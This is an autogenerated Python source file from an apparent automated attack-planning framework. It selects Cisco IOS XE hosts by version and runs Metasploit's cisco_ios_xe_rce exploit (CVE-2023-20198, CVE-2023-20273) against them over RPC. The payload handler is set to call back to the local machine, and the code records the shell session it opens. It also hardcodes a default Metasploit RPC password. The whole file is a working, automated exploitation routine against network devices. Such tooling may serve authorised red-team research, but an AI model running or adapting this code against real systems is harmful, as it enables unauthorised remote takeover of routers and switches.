# AUTOGENERATED FILE - DO NOT EDIT THIS FILE.
# This file is generated automatically and will be overwritten.
# All user modifications should be done in the subclass.

import re
import os
from typing import Any, Union
from pymetasploit3.msfrpc import MsfRpcClient
from netifaces import ifaddresses, AF_INET, gateways

from generate_metasploit_exploit_actions import ExploitAction
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from action_state_interface.action import StateChangeSequence
from action_state_interface.exec import ActionExecutionError, ActionExecutionResult

class MsfLinuxMiscCiscoIosXeRceExploitBase(ExploitAction):
    """MsfLinuxMiscCiscoIosXeRceExploit"""

    def __init__(self):
        super().__init__("MsfLinuxMiscCiscoIosXeRceExploit")

    noise = 0.8
    impact = 0.1


    def get_target_query(self) -> Query:
        """
        General implementation for msf exploits
        """
        asset = Entity('Asset', alias='asset', os_family="Linux")
        query = Query()
        query.match(asset)
        query.where("any(device IN [] WHERE toLower(asset.os_family) CONTAINS toLower(device))")
        
        query.where("any(version IN ['16.1.1', '16.1.2', '16.1.3', '16.2.1', '16.2.2', '16.3.1', '16.3.2', '16.3.3', '16.3.1', '16.3.4', '16.3.5', '16.3.5', '16.3.6', '16.3.7', '16.3.8', '16.3.9', '16.3.10', '16.3.11', '16.4.1', '16.4.2', '16.4.3', '16.5.1', '16.5.1', '16.5.1', '16.5.2', '16.5.3', '16.6.1', '16.6.2', '16.6.3', '16.6.4', '16.6.5', '16.6.4', '16.6.4', '16.6.5', '16.6.6', '16.6.5', '16.6.7', '16.6.7', '16.6.8', '16.6.9', '16.6.10', '16.7.1', '16.7.1', '16.7.1', '16.7.2', '16.7.3', '16.7.4', '16.8.1', '16.8.1', '16.8.1', '16.8.1', '16.8.1', '16.8.1', '16.8.2', '16.8.1', '16.8.3', '16.9.1', '16.9.2', '16.9.1', '16.9.1', '16.9.1', '16.9.1', '16.9.1', '16.9.3', '16.9.2', '16.9.2', '16.9.3', '16.9.4', '16.9.3', '16.9.3', '16.9.4', '16.9.5', '16.9.5', '16.9.6', '16.9.7', '16.9.8', '16.9.8', '16.9.8', '16.9.8', '16.10.1', '16.10.1', '16.10.1', '16.10.1', '16.10.1', '16.10.1', '16.10.1', '16.10.2', '16.10.1', '16.10.1', '16.10.3', '16.11.1', '16.11.1', '16.11.1', '16.11.2', '16.11.1', '16.11.1', '16.12.1', '16.12.1', '16.12.1', '16.12.1', '16.12.1', '16.12.2', '16.12.1', '16.12.2', '16.12.3', '16.12.8', '16.12.2', '16.12.1', '16.12.1', '16.12.2', '16.12.4', '16.12.3', '16.12.1', '16.12.3', '16.12.4', '16.12.5', '16.12.6', '16.12.1', '16.12.5', '16.12.5', '16.12.1', '16.12.6', '16.12.7', '16.12.9', '16.12.10', '17.1.1', '17.1.1', '17.1.1', '17.1.2', '17.1.1', '17.1.3', '17.2.1', '17.2.1', '17.2.1', '17.2.1', '17.2.2', '17.2.3', '17.3.1', '17.3.2', '17.3.3', '17.3.1', '17.3.1', '17.3.2', '17.3.1', '17.3.1', '17.3.3', '17.3.4', '17.3.5', '17.3.4', '17.3.6', '17.3.4', '17.3.4', '17.3.5', '17.3.5', '17.3.7', '17.3.8', '17.4.1', '17.4.2', '17.4.1', '17.4.1', '17.4.1', '17.4.2', '17.5.1', '17.5.1', '17.5.1', '17.5.1', '17.6.1', '17.6.2', '17.6.1', '17.6.1', '17.6.1', '17.6.3', '17.6.1', '17.6.1', '17.6.3', '17.6.4', '17.6.1', '17.6.5', '17.6.6', '17.7.1', '17.7.1', '17.7.1', '17.7.2', '17.10.1', '17.10.1', '17.10.1', '17.8.1', '17.8.1', '17.9.1', '17.9.1', '17.9.2', '17.9.1', '17.9.1', '17.9.1', '17.9.3', '17.9.2', '17.9.1', '17.9.3', '17.9.4', '17.9.1', '17.11.1', '17.11.1', '17.12.1', '17.12.1', '17.11.99'] WHERE toLower(asset.os_version) CONTAINS toLower(version))")
        
        query.ret_all()
        return query


    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """Execute the exploit against the target."""
        msf = MsfRpcClient(
            os.environ.get("MSFRPCD_PASSWORD", "tulpaOSApass24"),
            port=int(os.environ.get("MSF_PORT", 55552))
        )

        exploit = msf.modules.use("exploit", "linux/misc/cisco_ios_xe_rce")
        exploit['DisablePayloadHandler'] = False
        host = pattern.get('asset').get('ip_address')
        if 'RHOST' in exploit.missing_required:
            exploit['RHOST'] = host
        if 'rhost' in exploit.missing_required:
            exploit['rhost'] = host
        if 'RHOSTS' in exploit.options:
            exploit['RHOSTS'] = host
        if 'LHOST' in exploit.missing_required:
            exploit['LHOST'] = ifaddresses(
                gateways()["default"].get(AF_INET, [gateways()[AF_INET][0]])[1]
            ).setdefault(AF_INET)[0]['addr']
        if pattern.get('openport') and 'RPORT' in exploit.options:
            exploit['RPORT'] = pattern.get('openport').get('number')
        if 'AllowNoCleanup' in exploit.options:
            exploit["AllowNoCleanup"] = True
        output = msf.consoles.console().run_module_with_output(exploit)

        matches = re.search(r'session (\d+) opened', output.lower().strip())
        if matches:
            ms_session_id = matches.group(1)
            channel = msf.sessions.session(ms_session_id)
            sess_id = sessions.add_session(channel)
            return ActionExecutionResult(
                command=["msf", "exploit", "{module_name}"],
                stdout=output,
                session=sess_id,
                exit_status=0
            )
        else:
            raise ActionExecutionError(
                f"Couldn't create a session on {host} using msf exploit {exploit}, output: {output}"
            )


    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: Any
    ) -> StateChangeSequence:
        """Update knowledge graph with newly established session."""
        host = pattern.get('asset')
        executes_on = host._id
        openport = pattern.get('openport')
        service = pattern.get('service')
        if service:
            executes_on = service._id
        elif openport:
            executes_on = openport._id
        session = Entity(
            'Session',
            alias='session',
            protocol='msf',
            active=True,
            id=output.session,
            executes_on=executes_on,
        )
        changes: StateChangeSequence = [(None, "merge", session)]
        return changes


    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """Return expected outcome of action."""
        outcome = ""
        
        if pattern.get("openport"):
            outcome = 'Execute metasploit exploit linux/misc/cisco_ios_xe_rce against port ' + str(pattern.get("openport").get("number")) + ' on ' + pattern.get("asset").get("ip_address")
        else:
            outcome = 'Execute metasploit exploit linux/misc/cisco_ios_xe_rce against ' + pattern.get("asset").get("ip_address")
        
        outcome += " in order to exploit CVE-2023-20198 and CVE-2023-20273"
        return [outcome]
